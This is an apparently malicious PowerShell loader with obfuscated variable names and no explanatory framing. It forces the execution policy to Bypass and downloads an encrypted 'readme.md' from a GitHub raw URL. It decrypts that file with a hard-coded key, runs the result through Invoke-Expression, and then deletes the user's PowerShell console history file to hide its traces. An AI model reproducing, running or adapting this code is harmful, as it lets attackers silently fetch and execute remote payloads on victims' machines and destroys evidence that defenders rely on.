$sfdvihfgn = "isdguvsvhsifyhsdvn"

Function DecodeString
{
	[CmdletBinding()] Param (
		[Parameter(Position = 0, ValueFromPipeline = $True)]
		[ValidateNotNullOrEmpty()]
		[String]
		$obfString,
		
		[Parameter(Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Key		
    )
	
	$segsd = [System.Convert]::FromBase64String($Key)
		
	$werfg = (New-Object  Management.Automation.PSCredential ' ', ($obfString |ConvertTo-SecureString -Key  $segsd)).GetNetworkCredential().Password

	return $werfg
}

$rfvwd = "https://raw.githubusercontent.com/firepluswater/kato/refs/heads/main/"
$tid = "db"


function getinfo
{
	$Key = "duTvn/qoqTxrvjkID2J+ug=="
	$endtag = "readme.md"
	$downpsurl = $rfvwd + $endtag
	$codestring = (New-Object System.Net.WebClient).DownloadString($downpsurl)
	$comletter = DecodeString -obfString $codestring -Key $Key
	
	$result = Invoke-Expression $comletter	
}

function tyhgf
{
	Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy Bypass -Force

	getinfo
	$aqwrfszva = $env:appdata + "\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
	$fffd = Test-Path $aqwrfszva
	if($fffd -eq $True)
	{
		Remove-Item -path $aqwrfszva -Recurse
	}
	
}
tyhgf


